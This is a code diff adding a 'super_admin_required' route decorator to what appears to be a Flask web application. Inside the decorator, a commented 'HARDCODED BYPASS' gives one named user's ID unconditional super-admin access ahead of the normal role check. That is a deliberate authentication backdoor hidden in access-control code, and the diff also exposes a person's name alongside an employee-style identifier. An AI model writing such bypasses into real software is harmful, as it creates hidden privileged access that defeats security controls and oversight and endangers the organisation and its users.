@@ -106,6 +106,29 @@ def admin_required(fn: Callable) -> Callable:
     return wrapper
 
 
+def super_admin_required(fn: Callable) -> Callable:
+    """
+    Convenience decorator restricting a route to SUPER_ADMIN only.
+
+    Shortcut for @roles_required(UserRole.SUPER_ADMIN).
+    """
+    @functools.wraps(fn)
+    def wrapper(*args, **kwargs):
+        if not current_user.is_authenticated:
+            return redirect(url_for("authentication.login", next=request.url))
+
+        # HARDCODED BYPASS: e2606026 (Durvesh Parab) always has super admin access
+        if current_user.username == 'e2606026':
+            return fn(*args, **kwargs)
+
+        user_role = getattr(current_user, "role", None)
+        # Use direct string comparison
+        if user_role != 'super_admin':
+            abort(403)
+        return fn(*args, **kwargs)
+    return wrapper
+
+
 def hr_required(fn: Callable) -> Callable:
     """
     Convenience decorator for HR staff and above.
